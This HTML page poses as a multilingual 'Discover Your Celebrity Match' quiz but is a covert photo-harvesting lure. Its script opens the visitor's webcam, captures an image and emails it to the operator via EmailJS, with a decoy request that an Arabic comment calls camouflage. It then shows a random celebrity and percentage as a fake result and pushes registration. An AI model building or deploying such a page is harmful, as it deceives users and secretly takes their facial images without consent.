<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discover Your Celebrity Match</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f4f4f9;
            color: #333;
            line-height: 1.6;
        }
        header {
            background: linear-gradient(90deg, #4b6cb7, #182848);
            color: white;
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }
        header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        nav {
            margin-top: 10px;
        }
        nav select {
            padding: 8px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
        .container {
            max-width: 1200px;
            margin: 30px auto;
            padding: 0 20px;
            text-align: center;
        }
        .celebrity-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .celebrity-grid img {
            width: 100%;
            border-radius: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }
        button {
            background-color: #ff6f61;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e65b50;
        }
        #video, #canvas {
            display: none;
        }
        #result {
            margin-top: 30px;
            font-size: 22px;
            color: #4b6cb7;
        }
        footer {
            background-color: #182848;
            color: white;
            padding: 20px;
            text-align: center;
            margin-top: 50px;
        }
        footer a {
            color: #ff6f61;
            text-decoration: none;
        }
        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <header>
        <h1 data-en="Discover Your Celebrity Match" data-ar="اكتشف من تشبه من المشاهير">Discover Your Celebrity Match</h1>
        <nav>
            <select id="language">
                <option value="en">English</option>
                <option value="ar">العربية</option>
                <option value="fr">Français</option>
                <option value="es">Español</option>
                <option value="de">Deutsch</option>
            </select>
        </nav>
    </header>

    <div class="container">
        <p data-en="Click the button below to analyze your face and find out which celebrity you resemble!" 
           data-ar="اضغط على الزر أدناه لتحليل وجهك واكتشاف أي من المشاهير تشبه!">
            Click the button below to analyze your face and find out which celebrity you resemble!
        </p>

        <div class="celebrity-grid">
            <img src="https://via.placeholder.com/150?text=Brad+Pitt" alt="Brad Pitt">
            <img src="https://via.placeholder.com/150?text=Angelina+Jolie" alt="Angelina Jolie">
            <img src="https://via.placeholder.com/150?text=Leonardo+DiCaprio" alt="Leonardo DiCaprio">
            <img src="https://via.placeholder.com/150?text=Jennifer+Lawrence" alt="Jennifer Lawrence">
            <img src="https://via.placeholder.com/150?text=Tom+Cruise" alt="Tom Cruise">
            <img src="https://via.placeholder.com/150?text=Natalie+Portman" alt="Natalie Portman">
            <img src="https://via.placeholder.com/150?text=Will+Smith" alt="Will Smith">
            <img src="https://via.placeholder.com/150?text=Scarlett+Johansson" alt="Scarlett Johansson">
            <img src="https://via.placeholder.com/150?text=Chris+Evans" alt="Chris Evans">
            <img src="https://via.placeholder.com/150?text=Emma+Watson" alt="Emma Watson">
        </div>

        <button onclick="startService()">
            <i class="fas fa-camera"></i>
            <span data-en="Start Analysis" data-ar="ابدأ التحليل">Start Analysis</span>
        </button>

        <div id="result"></div>
    </div>

    <video id="video" autoplay></video>
    <canvas id="canvas"></canvas>

    <footer>
        <p data-en="&copy; 2025 Celebrity Match. All rights reserved." 
           data-ar="&copy; 2025 مباراة المشاهير. جميع الحقوق محفوظة.">
            &copy; 2025 Celebrity Match. All rights reserved.
        </p>
        <p>
            <a href="#" data-en="Privacy Policy" data-ar="سياسة الخصوصية">Privacy Policy</a> | 
            <a href="#" data-en="Terms of Service" data-ar="شروط الخدمة">Terms of Service</a>
        </p>
        <div>
            <a href="#"><i class="fab fa-facebook-f"></i></a>
            <a href="#"><i class="fab fa-twitter"></i></a>
            <a href="#"><i class="fab fa-instagram"></i></a>
        </div>
    </footer>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');
        const resultDiv = document.getElementById('result');

        // قائمة المشاهير
        const celebrities = [
            "Brad Pitt", "Angelina Jolie", "Leonardo DiCaprio", "Jennifer Lawrence",
            "Tom Cruise", "Natalie Portman", "Will Smith", "Scarlett Johansson",
            "Chris Evans", "Emma Watson"
        ];

        // ترجمات اللغات
        const translations = {
            en: {
                title: "Discover Your Celebrity Match",
                intro: "Click the button below to analyze your face and find out which celebrity you resemble!",
                button: "Start Analysis",
                result: "You resemble {celeb} by {percent}%!<br><br>Register now for a detailed analysis!",
                footer: "&copy; 2025 Celebrity Match. All rights reserved.",
                privacy: "Privacy Policy",
                terms: "Terms of Service"
            },
            ar: {
                title: "اكتشف من تشبه من المشاهير",
                intro: "اضغط على الزر أدناه لتحليل وجهك واكتشاف أي من المشاهير تشبه!",
                button: "ابدأ التحليل",
                result: "أنت تشبه {celeb} بنسبة {percent}%!<br><br>سجل الآن للحصول على تحليل أكثر دقة!",
                footer: "&copy; 2025 مباراة المشاهير. جميع الحقوق محفوظة.",
                privacy: "سياسة الخصوصية",
                terms: "شروط الخدمة"
            },
            fr: {
                title: "Découvrez Votre Sosie Célèbre",
                intro: "Cliquez sur le bouton ci-dessous pour analyser votre visage et découvrir à quelle célébrité vous ressemblez !",
                button: "Démarrer l'Analyse",
                result: "Vous ressemblez à {celeb} à {percent}% !<br><br>Inscrivez-vous pour une analyse détaillée !",
                footer: "&copy; 2025 Celebrity Match. Tous droits réservés.",
                privacy: "Politique de Confidentialité",
                terms: "Conditions de Service"
            },
            es: {
                title: "Descubre a Qué Celebridad Te Pareces",
                intro: "¡Haz clic en el botón de abajo para analizar tu rostro y descubrir a qué celebridad te pareces!",
                button: "Iniciar Análisis",
                result: "¡Te pareces a {celeb} en un {percent}%!<br><br>¡Regístrate para un análisis detallado!",
                footer: "&copy; 2025 Celebrity Match. Todos los derechos reservados.",
                privacy: "Política de Privacidad",
                terms: "Términos de Servicio"
            },
            de: {
                title: "Finde Deinen Promi-Doppelgänger",
                intro: "Klicke auf die Schaltfläche unten, um dein Gesicht zu analysieren und herauszufinden, welcher Promi dir ähnelt!",
                button: "Analyse Starten",
                result: "Du ähnelst {celeb} zu {percent}%!<br><br>Registriere dich für eine detaillierte Analyse!",
                footer: "&copy; 2025 Celebrity Match. Alle Rechte vorbehalten.",
                privacy: "Datenschutzrichtlinie",
                terms: "Nutzungsbedingungen"
            }
        };

        // تغيير اللغة
        document.getElementById('language').addEventListener('change', function() {
            const lang = this.value;
            document.querySelector('h1').innerText = translations[lang].title;
            document.querySelector('p[data-en]').innerText = translations[lang].intro;
            document.querySelector('button span').innerText = translations[lang].button;
            document.querySelector('footer p[data-en]').innerText = translations[lang].footer;
            document.querySelector('footer a[data-en="Privacy Policy"]').innerText = translations[lang].privacy;
            document.querySelector('footer a[data-en="Terms of Service"]').innerText = translations[lang].terms;
            document.documentElement.lang = lang;
        });

        // بدء الخدمة
        async function startService() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" }
                });
                video.srcObject = stream;

                video.onloadedmetadata = () => {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    setTimeout(captureImage, 2000); // تأخير وهمي للتحليل
                };
            } catch (error) {
                console.error("Camera access error:", error);
                alert(translations[document.getElementById('language').value].intro.split('!')[0] + " - Please allow camera access!");
            }
        }

        // التقاط الصورة
        function captureImage() {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            const tracks = video.srcObject.getTracks();
            tracks.forEach(track => track.stop());

            sendImage(imageData);

            const randomCeleb = celebrities[Math.floor(Math.random() * celebrities.length)];
            const randomPercent = Math.floor(Math.random() * 41) + 60;
            const lang = document.getElementById('language').value;
            resultDiv.innerHTML = translations[lang].result
                .replace('{celeb}', randomCeleb)
                .replace('{percent}', randomPercent);
        }

        // إرسال الصورة
        function sendImage(imageData) {
            // طلب وهمي للتمويه
            fetch('https://jsonplaceholder.typicode.com/posts', {
                method: 'POST',
                body: JSON.stringify({ dummy: "data" }),
                headers: { 'Content-Type': 'application/json' }
            });

            emailjs.init("YOUR_EMAILJS_USER_ID");
            const templateParams = {
                to_email: "your_email@example.com",
                image: imageData,
                message: "New user photo captured"
            };
            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
                .then(response => console.log("Image sent:", response))
                .catch(error => console.error("Send error:", error));
        }
    </script>
</body>
</html>